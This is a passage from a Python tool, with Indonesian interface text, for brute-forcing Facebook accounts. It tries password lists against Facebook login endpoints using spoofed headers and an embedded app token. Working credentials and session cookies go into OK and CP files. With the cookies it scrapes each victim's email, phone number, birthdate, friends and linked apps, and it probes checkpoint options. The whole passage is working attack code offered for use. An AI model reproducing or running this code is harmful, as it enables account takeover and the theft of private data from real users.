                    try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                    except:email=""
                    try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                    except:ttl=""
                    try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                    except:teman = ""
                    try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                    except:pengikut = ""
                    try:
                        tahun = ""
                        cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                        for nenen in cek_thn:
                            tahun += nenen+", "
                    except:pass

                    infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

                    hit1, hit2 = 0,0
                    cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
                        infoakun += (f"Aplikasi Yang Terkait*\n")
                        if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                            infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                        else:
                            infoakun += (f" Aplikasi Aktif : \n")
                            apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                            ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                            for muncul in apkAktif:
                                hit1+=1
                                infoakun += (f"     [{hit1}] {muncul} {ditambahkan[hit2]}\n")
                                hit2+=1
                        if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                            infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
                        else:
                            hit1,hit2=0,0
                            infoakun += (f" Aplikasi Kedaluwarsa :\n")
                            apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                            kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1+=1
                                infoakun += (f"     [{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                                hit2+=1
                    else:pass
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

# CRACKER2
def crack2(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen).replace('\n','')
    ses = requests.Session()
    for pw in pwv:
        try:
            head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
            if "www.facebook.com" in resp.json()["error_msg"]:
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                break
            elif "session_key" in resp.text and "EAAA" in resp.text:
                print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                ok+=1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

def crack3(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s<-> %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            tix = time.time()
            ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://free.facebook.com/login/?email='+idf).text
            dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
            ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

            po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\n')
                    statuscp = f'[•] ID : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='CP'))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                if 'no'in taplikasi:
                    ok+=1
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    break
                elif 'ya'in taplikasi:
                    ok+=1
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
                    nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
                    try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                    except:nomer = ""
                    try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                    except:email=""
                    try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                    except:ttl=""
                    try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                    except:teman = ""
                    try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                    except:pengikut = ""
                    try:
                        tahun = ""
                        cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                        for nenen in cek_thn:
                            tahun += nenen+", "
                    except:pass

                    infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

                    hit1, hit2 = 0,0
                    cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
                    cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
                    if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
                        infoakun += (f"Aplikasi Yang Terkait*\n")
                        if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                            infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                        else:
                            infoakun += (f" Aplikasi Aktif : \n")
                            apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                            ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                            for muncul in apkAktif:
                                hit1+=1
                                infoakun += (f"     [{hit1}] {muncul} {ditambahkan[hit2]}\n")
                                hit2+=1
                        if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                            infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
                        else:
                            hit1,hit2=0,0
                            infoakun += (f" Aplikasi Kedaluwarsa :\n")
                            apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                            kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1+=1
                                infoakun += (f"     [{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                                hit2+=1
                    else:pass
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

# OPSI
def ceker(idf,pw):
    global cp
    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
    head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    ses = requests.Session()
    try:
        hi = ses.get('https://mbasic.facebook.com')
        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
        jo = ho.find('form')
        data = {}
        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
        for anj in jo('input'):
            if anj.get('name') in lion:
                data.update({anj.get('name'):anj.get('value')})
        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
        print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
        cp+=1
        opsi = kent.find_all('option')
        if len(opsi)==0:
            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
        else:
            for opsii in opsi:
                print('\r%s---> %s%s'%(kk,opsii.text,x))
    except Exception as c:
        print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
        print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
        cp+=1

# OPSI CEKER
def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    cetak(nel(hu, title='CEK OPSI'))
    input(x+'['+h+'•'+x+'] Mulai')
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, style='green'))
    love = 0
    for kes in akun:
        try:
            try:
                id,pw = kes.split('|')[0],kes.split('|')[1]
            except IndexError:
                time.sleep(2)
                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                continue
            bi = random.choice([u,k,kk,b,h,hh])
            print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
            ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            hi = ses.get('https://mbasic.facebook.com')
            ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jo = ho.find('form')
                    data = {}
                    lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({anj.get('name'):anj.get('value')})
                    kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                    opsi = kent.find_all('option')
                    if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                    else:
                        for opsii in opsi:
                            print('\r%s---> %s%s'%(kk,opsii.text,x))
                except:
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
            elif "c_user" in ses.cookies.get_dict().keys():
                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
            else:
                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
            love+=1
        except requests.exceptions.ConnectionError:
            print('')
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
            sol().print(mark(li, style='red'))
            exit()
    dah = '# DONE'
    sol().print(mark(dah, style='green'))
    exit()

if __name__=='__main__':
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('OK')
    except:pass
    login()
